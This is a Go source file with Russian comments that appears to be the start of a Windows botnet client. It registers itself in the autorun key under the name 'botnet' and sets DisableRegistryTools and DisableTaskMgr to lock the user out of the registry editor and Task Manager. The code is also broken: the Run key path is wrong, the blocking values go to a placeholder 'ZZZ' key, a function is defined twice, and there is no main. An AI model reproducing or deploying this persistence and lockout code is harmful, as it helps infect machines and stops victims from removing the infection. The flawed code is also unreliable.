package main

import (
	"fmt"
	"golang.org/x/sys/windows/registry"  // Вот эта зараза несколько дней мозг выносила
	"log"
	"os"
	"path/filepath"
)

func AddAutorun() {
	dir, err := filepath.Abs(filepath.Dir(os.Args[0]))   //
	if err != nil {                                      // Определение местонахождения программы
		log.Fatal(err)                               //
	}
	fmt.Println(dir)
	adress := dir
	fmt.Println(adress)
	// Добавление ключа в реестр автозагрузок
	k, err := registry.OpenKey(registry.CURRENT_USER, `Software\Microsoft\Windows\Software\CurrentVersion\Run`, registry.QUERY_VALUE|registry.SET_VALUE)
	if err != nil {
		log.Fatal(err)
	}
	if err := k.SetStringValue("botnet", adress); err != nil {
		log.Fatal(err)
	}
	if err := k.Close(); err != nil {
		log.Fatal(err)
	}
}

// Cоздание sub_key System (по умолчанию его нет), на этоп этапе нужны права администратора...
func create(){
	k, b, err := registry.CreateKey(registry.CURRENT_USER, `Software\Microsoft\Windows\CurrentVersion\Policies\System`, uint32(0xf003f))
	if err != nil {
		log.Fatal(err)
	}
	if err := k.Close(); err != nil {
		log.Fatal(err)

	}
	fmt.Println(b)
}

// Блокировка доступа ко встроенному редактору реестра
func blockreestr() {
	k, err := registry.OpenKey(registry.CURRENT_USER, `Software\Microsoft\ZZZ`, registry.QUERY_VALUE|registry.SET_VALUE)
	if err != nil {
		log.Fatal(err)
	}
	if err := k.SetDWordValue("DisableRegistryTools", uint32(1)); err != nil {  // Имя ключа как в статье на хабре
		log.Fatal(err)
	}
	if err := k.Close(); err != nil {
		log.Fatal(err)
	}
}
// Блокировка доступа к диспетчеру задач
func blockreestr() {
	k, err := registry.OpenKey(registry.CURRENT_USER, `Software\Microsoft\ZZZ`, registry.QUERY_VALUE|registry.SET_VALUE)
	if err != nil {
		log.Fatal(err)
	}
	if err := k.SetDWordValue("DisableTaskMgr", uint32(1)); err != nil {  // Имя ключа как в статье на хабре
		log.Fatal(err)
	}
	if err := k.Close(); err != nil {
		log.Fatal(err)
	}
}
